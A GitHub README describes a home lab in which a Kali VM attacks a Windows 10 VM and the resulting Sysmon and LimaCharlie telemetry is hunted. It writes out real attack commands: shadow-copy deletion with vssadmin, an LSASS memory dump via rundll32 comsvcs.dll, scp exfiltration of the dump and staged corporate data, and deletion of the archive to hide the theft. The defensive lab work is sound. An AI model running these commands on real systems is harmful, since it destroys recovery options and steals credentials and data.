# 🛡️ Windows Telemetry Hardening & Enterprise Threat Hunting Lab

An end-to-end blue team simulation replicating a multi-stage intrusion lifecycle (Ransomware Inhibition, Advanced Credential Access, Double-Extortion Data Staging, Exfiltration, and Cryptographic Impact). This lab tracks the generation of endpoint events via Microsoft Sysmon and processes real-time telemetry pipelines inside the cloud-native LimaCharlie EDR/SIEM platform, culminating in active Detection Engineering automation.

---

## 📊 Quick Links & Deliverables
*   **Project Presentation Link:** [👉 Click Here to View the Google Slides Presentation](PASTE_YOUR_GOOGLE_SLIDES_SHARE_LINK_HERE)
*   **Target Machine Architecture:** Windows 10 Home (Hardened Endpoint Sensor Node)
*   **Attack Infrastructure:** Kali Linux via Private Hypervisor Network Bridge (`192.168.10.0/24`)
*   **EDR Control Plane:** LimaCharlie Cloud-Native Security Operations Interface

---

## 🏗️ 1. Architecture & Lab Environment Baseline

This environment mirrors a corporate perimeter intrusion zone where an external adversary bridges network boundaries to establish a command-and-control footprint on a local asset.

### Infrastructure Blueprint
*   **Attacker Node (Kali Linux):** Positioned on private virtual subnet segment `192.168.10.250`.
*   **Target Endpoint (Windows 10):** Positioned at static local node `192.168.10.9`. 
*   **Telemetry Forwarder (Microsoft Sysmon):** Deployed locally to capture advanced event arrays (Process Creation, Network Connections, File Integrity Events, Process Access Memory Handles).
*   **SIEM Engine (LimaCharlie EDR):** Deployed via an active host sensor configuration, facilitating live detection parsing and real-time automated telemetry analytics streams.

---

## 🛑 2. Intrusion Simulation & Forensic Timeline Analysis




### Use Case 1: Inhibit System Recovery (Ransomware Pre-Cursor)

*   **MITRE ATT&CK Mapping:** T1490 — Inhibit System Recovery

#### 📝 Use Case Introduction
Before a ransomware attacker locks up a target computer with encryption, they face a major obstacle: automatic system backups. Modern operating systems frequently save hidden snapshots of your files (called Volume Shadow Copies) so that if something breaks, you can easily roll the system back in time and restore your clean data.

If an attacker leaves these backups intact, the victim company will simply restore their machines for free instead of paying a ransom. Therefore, the threat actor's very first step is to hunt down and completely destroy every backup copy on the hard drive. By wiping out the system's safety nets, the attacker forces the victim into a corner where they have no choice but to pay the ransom to get their operations back online.

---

#### 📸 Step 1: Network Reconnaissance (Finding the Target)

<img width="887" height="434" alt="Screenshot 2026-06-15 140418" src="https://github.com/user-attachments/assets/e9987c1d-539f-4dc0-9dce-7256e1aeff6b" />


**The Action:** The attacker uses a network scanning tool called Nmap to scan the network. This allows them to discover the target Windows computer and find out its true name (`DESKTOP-BU3CNBB`) and open doors without needing to log in.

---

#### 📸 Step 2: Remote Access (Gaining a Footprint)

<img width="935" height="434" alt="Screenshot 2026-06-15 142011" src="https://github.com/user-attachments/assets/66f0fe9c-beac-4944-b368-59fa34e7c59a" />


**The Action:** Once the attacker knows the computer is active on the network, they use an encrypted SSH connection to log into the machine remotely over Port 22 using stolen or discovered credentials. The attacker now has an active, remote command line connection to control the victim's system.

---

#### 📸 Step 3: Remote Access & Account Verification

<img width="950" height="434" alt="Screenshot 2026-06-15 001959" src="https://github.com/user-attachments/assets/9d1dacf6-1069-4443-988c-bea6a2aa4a1a" />


**Command 1:** `whoami`
*   **What it does in simple terms:** This command asks the computer, *"Who am I logged in as right now?"* The system responds with `desktop-bu3cnbb\target-pc2`, confirming to the remote attacker that their login worked and that they have administrative control over the machine.

**Command 2:** `vssadmin delete shadows /all /quiet`
*   **What it does in simple terms:** This command tells the Windows operating system to locate every single automatic file backup snapshot on the drive and delete them all immediately. The `/quiet` flag ensures that the computer deletes them silently in the background without popping up any warning messages for the user.




### Use Case 2: High-Privilege Credential Access (LSASS Memory Dump)
*   **MITRE ATT&CK Mapping:** T1003.001 — OS Credential Dumping: LSASS Memory

#### 📝 Use Case Introduction
When an attacker gains initial access to a single computer, they are usually trapped inside a standard user account with limited permissions. To take over the entire corporate network, the attacker needs administrative passwords to log into other systems [3.3].

In this phase, the attacker targets a core Windows security program called **LSASS** (`lsass.exe`), which manages active user sessions and temporarily holds encrypted login keys inside the computer's running memory (RAM) [3.3]. By copying everything out of this program's memory space and saving it into a hidden file, the attacker creates a permanent snapshot of the system's active passwords [3.3]. This file can then be stolen and unlocked offline, giving the threat actor the administrative credentials needed to compromise the rest of the enterprise network [3.3].

---


#### 📸 Step 1: Process Reconnaissance & The Antivirus Roadblock

<img width="958" height="427" alt="Screenshot 2026-06-15 002545" src="https://github.com/user-attachments/assets/653cc153-e20a-4f6f-8f8c-e00f140b493f" />


**Command 1:** `tasklist /fi "imagename eq lsass.exe"`

*   **What it does in simple terms:** This command searches the computer to find the exact tracking number (called a Process ID) of the Windows password vault (`lsass.exe`) [3.3]. The attacker needs this specific number (`604`) to point their attack tools at it.

**Command 2:** `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 604 C:\Users\Target-PC2\Documents\lsass.dmp full`
*   **What it does in simple terms:** This command tells the computer to take a complete snapshot of that password vault's memory and save it as a file named `lsass.dmp` [3.3]. 
*   **The Result:** Because the computer's security guards were still turned on, Windows Defender blocked the command immediately and shouted **"Access is denied,"** saving the passwords from being copied.

---

#### 📸 Step 2: Bypassing the Protection (Silent Execution)

<img width="959" height="430" alt="Screenshot 2026-06-15 005111" src="https://github.com/user-attachments/assets/1ff82602-bb74-4008-a2c3-304051fb6671" />


**The Action:** The attacker opens the Windows settings menu, temporarily turns off the real-time security guards, and inputs the exact same `rundll32.exe` command a second time.
*   **What it does in simple terms:** With the security guards paused, the command runs perfectly. It makes no noise, displays no error messages, and returns straight to a clean prompt line. This means the computer silently allowed the memory snapshot to take place.

---

#### 📸 Step 3: Verifying the Stolen Credential File

<img width="956" height="434" alt="Screenshot 2026-06-15 005215" src="https://github.com/user-attachments/assets/d9772924-de25-48eb-9739-c950de8a75bd" />


**Command 3:** `dir C:\Users\Target-PC2\Documents\lsass.dmp`
*   **What it does in simple terms:** This command looks inside the Documents folder to confirm that the hidden file was actually generated on the hard drive.
*   **The Proof:** The text on the screen explicitly proves that a permanent **55,848,099-byte file** was created. The attacker successfully copied a raw snapshot of the active system passwords onto the local disk.


---

#### 📸 Step 4: Exfiltrating the Credential Snapshot to the Attacker Node

<img width="917" height="433" alt="Screenshot 2026-06-15 145922" src="https://github.com/user-attachments/assets/d470da50-bf14-48ab-841c-239f9fd1ed02" />


**Command 4:** `scp Target-PC2@192.168.10.9:Documents/lsass.dmp ~/Desktop/`
*   **What it does in simple terms:** Run from a local terminal on the attacker's Kali Linux machine, this command reaches out across the network to the victim computer using Secure Copy Protocol (SCP). It downloads the 55MB `lsass.dmp` password snapshot file directly onto the attacker's own desktop.
*   **The Final Proof:** Running the local file listing check (`ls -la`) on Kali confirms the file arrived completely with its size intact (**55,848,099 bytes**). The attacker now has a permanent copy of the victim's active memory vault completely in their hands, ready to be cracked offline to harvest administrative network passwords.






### Use Case 3: Double-Extortion Collection, Data Staging, and Exfiltration

*   **MITRE ATT&CK Mapping:** T1074.001 — Data Staging: Local Data Staging & T1048 — Exfiltration Over Alternative Protocol

#### 📝 Use Case Introduction
In modern cyberattacks, threat actors practice **Double Extortion**. They steal a copy of the company's confidential documents *before* locking up the systems. If the company refuses to pay the ransom because they have offline backups, the attacker threatens to leak their secrets on the dark web instead.

To speed up the theft and avoid raising alarms, the attacker does not download files one by one. They gather everything into a temporary folder, archive it into a single `.zip` file, download it over a network tunnel, and then delete the local file to clear their tracks.

---

#### 📸 Step 1: Automated Data Staging (Packaging the Secrets)

<img width="959" height="439" alt="Screenshot 2026-06-15 170459" src="https://github.com/user-attachments/assets/4fef839a-6652-48c3-9520-0bebd6e56b84" />


**Command 1:** `powershell Compress-Archive -Path C:\CorporateData -DestinationPath C:\Windows\Temp\sensitive_exfil.zip -Force`
*   **What it does in simple terms:** This command packages up the entire corporate data folder containing private files and compresses it into a hidden archive file called `sensitive_exfil.zip` inside the Windows Temp directory.

---

#### 📸 Step 2: Data Exfiltration (Stealing the Package)

<img width="950" height="436" alt="Screenshot 2026-06-15 170813" src="https://github.com/user-attachments/assets/70a9d1be-4852-408d-9bdd-32655e96b80e" />


**Command 2:** `scp Target-PC2@192.168.10.9:../../Windows/Temp/sensitive_exfil.zip ~/Desktop/`
*   **What it does in simple terms:** Run from the attacker's local Kali Linux machine, this command downloads the hidden zip package across the network tunnel and saves it directly onto the attacker's desktop background.

---

#### 📸 Step 3: Verifying the Stolen Data Collection

<img width="938" height="431" alt="Screenshot 2026-06-15 171315" src="https://github.com/user-attachments/assets/4f6d8a2a-9817-41de-86cf-548bed343562" />


**Command 3:** `ls -la`
*   **What it does in simple terms:** The attacker inspects their local folder workspace to ensure the stolen corporate records arrived successfully and are completely in their possession.

---

#### 📸 Step 4: Defense Evasion (Covering Attack Footprints)

<img width="959" height="434" alt="Screenshot 2026-06-15 171932" src="https://github.com/user-attachments/assets/574195da-f5ed-4b6c-97d9-1d368fd801a0" />


**Command 4:** `del C:\Windows\Temp\sensitive_exfil.zip`
*   **What it does in simple terms:** Now that the attacker has stolen the files, they run a delete command to wipe the `.zip` archive off the victim's hard drive. This covers their tracks and removes any obvious signs of data theft before they trigger the ransomware.





### Use Case 4: Action on Objectives (Cryptographic Ransomware Impact)

*   **MITRE ATT&CK Mapping:** T1486 — Data Encrypted for Impact

#### 📝 Use Case Introduction
Once system backups are destroyed, passwords are stolen, and confidential files are safely copied to the attacker's machine, the intrusion lifecycle reaches its final, devastating stage: **Data Encryption**. 

The attacker detonates the ransomware payload to scramble the victim's data using custom code loops. This locks up every corporate document on the disk, appends a unreadable file extension, and drops a high-visibility extortion letter on the desktop demanding payment.

---

#### 📸 Step 1: Ransomware Detonation & Execution

<img width="1920" height="892" alt="VirtualBox_kali-linux-2025 4-virtualbox-amd64_12_06_2026_01_50_13" src="https://github.com/user-attachments/assets/9ddf4ea3-ee0b-45c6-80a0-2d91db52caef" />


**Command 1:** `powershell.exe -c "Get-ChildItem C:\CorporateData\* ..."`
*   **What it does in simple terms:** This script searches the entire corporate data folder, reads every text and spreadsheet file, scrambles their contents into unreadable code text blocks, renames them with a `.locked` file extension, and deletes the original readable copies. 
*   **The Final Impact:** At the exact same time, the script generates a new text file named `READ_ME_RANSOM.txt` directly onto the victim's desktop, warning them that their company files are compromised and demanding a ransom payment to unlock them.


---




## 🔍 2. Threat Hunting & SIEM Telemetry Analysis

#### 📝 Threat Hunting Introduction
An entry-level analyst simply looks to see if a computer screen has a virus warning on it. A professional enterprise analyst uses a centralized cloud platform like **LimaCharlie** combined with local Windows logs to hunt for hidden digital footprints. 

Below is the forensic investigation trail. It tells the story of how the defender connects the local system clues to the cloud alerts to unmask the attacker's entire strategy.

---

### 🛡️ Phase 1 Tracking: Threat Hunting the Backup Deletion
*   **The Attacker's Action:** The hacker executed `vssadmin delete shadows /all /quiet` to destroy all automatic system backups.

#### 📸 Local Footprint: Windows Sysmon Event ID 1 (Process Creation)

<img width="1920" height="892" alt="VirtualBox_Windows10N_15_06_2026_23_53_33" src="https://github.com/user-attachments/assets/e34df429-5fb8-497e-9099-ec6c0a5d076f" />


*   **What the Defender Discovers:** By finding this local log, the defender discovers the attacker's primary motive: **Inhibiting System Recovery**. The defender understands that a hacker is on the network and is intentionally destroying the system's safety nets to make sure the company cannot restore its files for free. 

#### 📸 Cloud Telemetry: SIEM Live Feed Stream

<img width="1280" height="638" alt="WhatsApp Image 2026-06-12 at 11 07 14 PM" src="https://github.com/user-attachments/assets/cb83dc94-60ce-4707-99fd-d492baa7ede4" />


*   **What the Defender Discovers:** In the cloud console, the defender unmasks **where the attack came from**. By examining the process lineage, the defender sees that the command prompt (`cmd.exe`) was spawned by the OpenSSH service (`sshd.exe`). The defender now understands that this wasn't a local employee mistake; a remote attacker has successfully logged into the machine from the outside world.

#### 📸 Cloud Telemetry: Historical Timeline Index

<img width="1280" height="641" alt="WhatsApp Image 2026-06-12 at " src="https://github.com/user-attachments/assets/6785ddd1-48cc-440d-b1d7-7c5730c11e8b" />


*   **What the Defender Discovers:** By looking at the historical timeline, the defender establishes the **exact timestamp of the incident** (`20:53:19`). The defender understands that even if the attacker clears their screen or disconnects, the cloud platform has locked the event permanently in history, allowing the security team to build an accurate forensic timeline of the breach.

---

### 🛡️ Phase 2 Tracking: Threat Hunting the Memory Dump
*   **The Attacker's Action:** The hacker disabled the antivirus guards and ran a script tool (`rundll32.exe`) to clone the computer's password storage service (`lsass.exe`) into a file.

#### 📸 Local Footprint: Windows Sysmon Event ID 1 (Process Creation)

<img width="1920" height="892" alt="VirtualBox_Windows10N_11_06_2026_17_53_14" src="https://github.com/user-attachments/assets/d1e78541-688f-4cc8-a951-7d335201cc97" />


*   **What the Defender Discovers:** The defender finds the second, successful attack execution on the hard drive. By reading the script parameters, the defender understands that the hacker used an advanced "Living off the Land" trick (using a trusted built-in Windows tool to run a malicious memory dump) to slip past basic file filters undetected.

#### 📸 Local Footprint: Windows Sysmon Event ID 10 (Process Access Handle)

<img width="1920" height="892" alt="VirtualBox_Windows10N_11_06_2026_18_05_39" src="https://github.com/user-attachments/assets/ba3dc295-b659-49d9-883b-d8e156efce0c" />


*   **What the Defender Discovers:** This log acts as the **ultimate proof of credential theft**. The defender sees that an outside application requested a deep handle to look inside the password storage vault (`lsass.exe`). The defender instantly understands that the attacker has successfully copied the system's active passwords and security keys.

#### 📸 Cloud Telemetry: High-Integrity Process Detection

<img width="853" height="424" alt="Screenshot 2026-06-16 003519" src="https://github.com/user-attachments/assets/2ba52300-19e4-44dc-bf5b-9a964b068b8b" />


*   **What the Defender Discovers:** Inside the cloud SIEM, the defender checks the permission levels used during the attack. By spotting **`"IntegrityLevel": "High"`**, the defender understands that the attacker has successfully gained full administrative rights on the machine, giving them the power to control the entire operating system.

#### 📸 Cloud Telemetry: Evasion Technique Mapping

<img width="855" height="421" alt="Screenshot 2026-06-16 003942" src="https://github.com/user-attachments/assets/cf82ab0a-4794-4c95-a99a-a44fe31c6f5a" />


*   **What the Defender Discovers:** The defender exposes the attacker's scripting tool. By seeing that `powershell.exe` was used to launch the memory dump, the defender understands the exact scripting method the hacker used to bypass standard system boundaries.

#### 📸 Cloud Telemetry: Timeline Validation

<img width="854" height="422" alt="Screenshot 2026-06-16 004521" src="https://github.com/user-attachments/assets/81935708-cf55-436c-aba6-e3e03b12ad3a" />


*   **What the Defender Discovers:** The defender traces where the stolen password file was saved. The timeline log points directly to `C:\Users\Target-PC2\Documents\lsass.dmp`. The defender now understands exactly which file on the hard drive contains the compromised company keys and must be securely deleted immediately.

---

### 🛡️ Phase 3 Tracking: Threat Hunting the Data Leak (Exfiltration)
*   **The Attacker's Action:** The hacker packed up corporate text documents into a `.zip` archive and used a secure file transfer tool (`scp`) to copy the file over the network to their Kali Linux machine.

#### 📸 Local Footprint: Windows Sysmon Event ID 11 (File Creation)

<img width="1920" height="892" alt="VirtualBox_Windows10N_12_06_2026_01_03_20" src="https://github.com/user-attachments/assets/f794bc34-2fe6-4080-9e2c-f415c7245bc3" />


*   **What the Defender Discovers:** The defender finds the **Data Staging** phase. By locating the creation of `sensitive_exfil.zip` inside the system's temporary directory (`C:\Windows\Temp\`), the defender understands that the attacker was actively bundling private company databases together into a single package so they could steal them easily in one download.

#### 📸 Local Footprint: Windows Sysmon Event ID 3 (Network Connection)

<img width="1920" height="892" alt="VirtualBox_Windows10N_11_06_2026_03_00_06" src="https://github.com/user-attachments/assets/a4687d36-4674-413e-9786-e6dc07dbe5c6" />


*   **What the Defender Discovers:** This log captures the exact moment the corporate data transfer took place across network boundaries. The defender discovers an active **Event ID 3 (Network Connection)** coming from the OpenSSH background program (`sshd.exe`). 

Even though the raw number 22 is translated by the system, the program name tells the defender that an external network address (`192.168.10.250`) is using an active Port 22 remote tunnel to pull files off the machine. The defender instantly recognizes this as a **Data Exfiltration breach** and flags the hacker's exact network identity.


#### 📸 Cloud Telemetry: Live Feed Network Pipe Logging

<img width="1280" height="644" alt="Data exfiltration (2)" src="https://github.com/user-attachments/assets/5d1a8b6b-2afe-454e-aa14-58168c9aec83" />


*   **What the Defender Discovers:** The cloud console highlights the live outbound traffic flow. The defender sees the network pipe transferring data over Port 22, understanding that the attacker is leveraging an authorized network shell connection to hide their unauthorized data theft behavior.

#### 📸 Cloud Telemetry: Consolidated Session Analysis

<img width="1280" height="625" alt="Data exfiltration (1)" src="https://github.com/user-attachments/assets/5f2116db-4575-424d-b104-3a68e8558c6d" />

*   **What the Defender Discovers:** The defender uses this cloud network view to catch an active **Data Exfiltration breach** in progress. By filtering the centralized logs, the defender flags a critical `NETWORK_CONNECTIONS` event linked directly to the system's secure copy file utility (`sshd.exe`).

The defender instantly understands that an outside attacker is actively using the machine's secure network doorways to copy files off the computer. This visual proof allows the security team to identify the exact unauthorized application used to siphon information and proves that confidential data has been stolen over the wire.


---

### 🛡️ Phase 4 Tracking: Threat Hunting the Ransomware Encryption
*   **The Attacker's Action:** The hacker ran a malicious script loop that encrypted company folders with a `.locked` extension and dropped a ransom note file onto the desktop background.

#### 📸 Local Footprint: Windows System Impact View (GUI)

<img width="1920" height="892" alt="VirtualBox_Windows10N_12_06_2026_01_54_34" src="https://github.com/user-attachments/assets/f2f8bfa7-5b1b-4712-87a0-acd4b11bc38a" />


*   **What the Defender Discovers:** The defender witnesses the **Action on Objectives** phase. Looking at the screen, the defender understands the final impact of the attack: all primary company documents have been destroyed and locked with a `.locked` extension, and the enterprise is now facing a live extortion demand for 1 BTC.

#### 📸 Local Footprint: Windows Sysmon Event ID 11 (Ransom File Drop)

<img width="1920" height="892" alt="VirtualBox_Windows10N_12_06_2026_01_59_56" src="https://github.com/user-attachments/assets/a2e472eb-03da-4326-a077-72f215615e17" />


*   **What the Defender Discovers:** The local log tracks the drop of the extortion demand. The defender discovers that a PowerShell script explicitly wrote a file named `READ_ME_RANSOM.txt` directly onto the user's desktop profile path, confirming that a ransomware payload has been detonated.

#### 📸 Cloud Telemetry: Live Feed File Creation Event

<img width="1280" height="635" alt="Ransomware Encryption   Impact Telemetry (1)" src="https://github.com/user-attachments/assets/dee51469-6363-438d-8aeb-fddc70013368" />


*   **What the Defender Discovers:** The cloud live feed logs the exact moment the ransomware message hit the desktop interface. The defender understands that an automated attack script is currently modifying files on the desktop and can trigger immediate incident response isolation protocols to stop the script from spreading to other network drives.

#### 📸 Cloud Telemetry: Historical Threat Mapping
<img width="1280" height="643" alt="Ransomware Encryption   Impact Telemetry (2)" src="https://github.com/user-attachments/assets/73049d0e-f61a-46d4-bc48-0b5341514a4d" />

*   **What the Defender Discovers:** The defender uses this centralized cloud timeline view to locate the final impact of the attack. By running a simple search for the word `ransom`, the defender isolates a critical file event where a new file named `READ_ME_RANSOM.txt` was dropped directly onto the victim's desktop folder profile. The defender instantly recognizes this as the official extortion demand, proving that a ransomware payload has been detonated on the endpoint.


---

